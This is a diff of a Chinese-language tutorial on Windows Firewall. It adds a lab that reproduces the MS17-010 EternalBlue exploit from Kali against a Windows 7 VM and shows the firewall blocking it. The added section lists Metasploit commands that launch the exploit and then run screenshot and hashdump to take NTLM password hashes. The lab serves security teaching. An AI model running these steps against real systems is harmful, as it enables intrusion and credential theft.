@@ -151,26 +151,61 @@ Windows 防火墙提供三个网络配置文件：域、专用和公用。网络
 * 公共网络：  
 公共网络配置文件在设计时考虑了公共网络（如 Wi-Fi 热点、咖啡店、机场、酒店等）的安全性。它是身份不明网络的默认配置文件。  
 
-<!-- ### 2.4 windows防火墙配置实操，以MS17-010为例  
+### 2.4 windows防火墙简易测试，以MS17-010为例  
 * 漏洞简介：
 永恒之蓝漏洞通过 TCP 的445和139端口，来利用 SMBv1 和 NBT 中的远程代码执行漏洞，通过恶意代码扫描并攻击开放445文件共享端口的 Windows 主机。只要用户主机开机联网，即可通过该漏洞控制用户的主机。不法分子就能在其电脑或服务器中植入勒索病毒、窃取用户隐私、远程控制木马等恶意程序。445端口是TCP共享服务 445端口它将尝试同时连接到端口139和445。如果端口445有响应，它将向端口139发送TCPRST数据包，以断开并继续与端口455的通信；当端口445没有响应时，使用端口139。139 NetBIOS File and Print Sharing 通过这个端口进入的连接试图获得NetBIOS/SMB服务。这个协议被用于Windows"文件和打印机共享"和SAMBA。在Internet上共享自己的硬盘可能是最常见的问题。139属于TCP协议。  
 
 * 受影响的版本：
 目前已知受影响的 Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0  
 
-#### 实验过程
+#### 环境搭建
 
-##### 环境搭建
-
-* 受害机：Windows7  
+* 受害机：Windows7 (professional x64) 
 * 攻击机：Kali  
 * 工具：namap、metasploit(msf)  
-Metasploit Framework(MSF)是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程，被安全社区冠以“可以黑掉整个宇宙”之名。刚开始的Metasploit是采用Perl语言编写的，但是再后来的新版中，改成了用Ruby语言编写的了。在kali中，自带了Metasploit工具。
+Metasploit Framework(MSF)是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程，被安全社区冠以“可以黑掉整个宇宙”之名。刚开始的Metasploit是采用Perl语言编写的，但是再后来的新版中，改成了用Ruby语言编写的了。在kali中，自带了Metasploit工具。  
+* 配置过程  
+点击 `编辑虚拟机设置` ，分别将win7、kali自带的网卡设置成桥接模式，如果不想改动原来网卡的配置，可以点击：`添加>网络适配器` ，添加一块新的网络适配器（网卡）后设置成桥接模式，如图所示我就是添加了新的适配器后再设置的：  
 
-##### 复现过程
- -->
+![](./img/win7_adaptor.jpg)  
 
-### 2.4 防火墙常见厂商  
+![](./img/kali_adaptor.jpg)  
+
+#### 复现过程
+配置完环境后，就可以开始测试了，需要用到的命令：  
+```bash
+#进入msf
+msfconsole
+#使用search命令查找相关漏洞
+search ms17
+#进入漏洞利用模块
+use exploit/windows/smb/ms17_010_eternalblue
+#查看模块参数
+show options
+#配置相关参数
+set rhost 192.168.137.132
+#攻击
+exploit/run
+#测试命令，查看IP，获取截屏，获取系统所有用户名和密码的哈希值（NTLM）
+ipconfig
+screenshot
+hashdump
+```  
+注意：若不关闭win7的防火墙，外部的主机kali便无法与之通信，更无法完成攻击。
+* 关闭防火墙后第一次攻击，攻击到一半，显示成功，但远程主机win7为保护系统安全，自动关机，第一次攻击以失败告终：  
+![kali_firstattack](./img/kali_first_attack.jpg)  
+
+![first_attack](./img/first_attack.jpg)  
+
+* 关闭防火墙后第二次攻击，此时已重启win7，最终攻击成功，并且成功执行远程命令 `screenshot` ：  
+![kali_secondattack](./img/kali_second_attack.jpg)  
+
+![screenshot](./img/kali_attack_screenshot.jpg)  
+
+* 重新开启防火墙，攻击失败：  
+![restart_firewall](./img/restart_firewall.jpg)  
+
+### 2.5 防火墙常见厂商  
 1.Juniper/NetScreen  
 NetScreen由三位留美的清华学子创建，其防火墙和VPN产品无论从性能指标还是质量上都位居世界前列。其防火墙产品的具体功能特性为：拥有专用的操作系统ScreenOS、拥有专门优化的硬件增强技术、集成VPN、灵活的流量管理、基于ASIC的访问策略的执行、管理简单快捷。  
 
